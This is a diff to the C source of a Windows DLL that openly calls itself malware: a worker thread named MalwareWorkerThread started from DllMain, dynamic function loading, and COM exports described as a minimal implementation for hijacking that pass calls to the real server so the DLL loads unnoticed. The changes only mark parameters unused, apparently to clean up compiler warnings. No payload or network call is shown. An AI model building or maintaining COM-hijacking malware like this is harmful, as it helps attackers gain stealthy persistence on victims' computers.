@@ -15,7 +15,7 @@ static HANDLE g_hThread = NULL;
 static volatile BOOL g_bRunning = FALSE;
 
 // Worker thread function
-DWORD WINAPI MalwareWorkerThread(LPVOID lpParameter) {
+DWORD WINAPI MalwareWorkerThread(LPVOID lpParameter __attribute__((unused))) {
     // Initialize dynamic function loading
     if (!InitializeDynamicFunctions()) {
         // Failed to load critical functions
@@ -51,7 +51,7 @@ DWORD WINAPI MalwareWorkerThread(LPVOID lpParameter) {
 }
 
 // DLL Entry Point
-BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved __attribute__((unused))) {
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH:
             g_hInstance = hinstDLL;
@@ -80,7 +80,7 @@ BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 }
 
 // COM Server exports - minimal implementation for hijacking
-__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
+__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid __attribute__((unused)), REFIID riid __attribute__((unused)), LPVOID* ppv __attribute__((unused))) {
     // Return CLASS_E_CLASSNOTAVAILABLE to let the legitimate COM server handle it
     // This allows the DLL to be loaded but passes through to the real handler
     return CLASS_E_CLASSNOTAVAILABLE;
